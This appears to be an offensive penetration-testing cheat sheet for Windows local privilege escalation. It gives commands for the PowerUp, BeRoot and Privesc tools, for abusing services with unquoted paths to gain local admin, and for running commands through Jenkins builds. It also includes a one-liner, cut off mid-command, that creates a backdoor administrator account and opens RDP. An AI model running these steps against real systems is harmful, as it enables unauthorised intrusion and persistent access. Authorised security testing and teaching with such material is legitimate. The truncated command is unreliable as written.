# Local Privilege Escalation

**Privesc check all**

[https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc)

```
. .\privesc.ps1
Invoke-PrivEsc
```

**Beroot check all**

[https://github.com/AlessandroZ/BeRoot](https://github.com/AlessandroZ/BeRoot)

```
./beRoot.exe
```

**Run powerup check all**

[https://github.com/HarmJ0y/PowerUp](https://github.com/HarmJ0y/PowerUp)

```
. ./powerup
Invoke-allchecks
```

**Run powerup get services with unqouted paths and a space in their name**

```
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
```

**Abuse service to get local admin permissions with powerup**

```
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
```

#### Add user to local admin and RDP group and enable RDP on firewall

```
net user <username> <password> /add /Y   && net localgroup administrators <username> /add   && net localgroup "Rem
```

**Jekins**

```
Runs as local admin, 

go to /job/project/configure to try to see if you have build permissions in

/job/project0/configure

Execute windows or shell comand into the build, you can also use powershell scripts
```
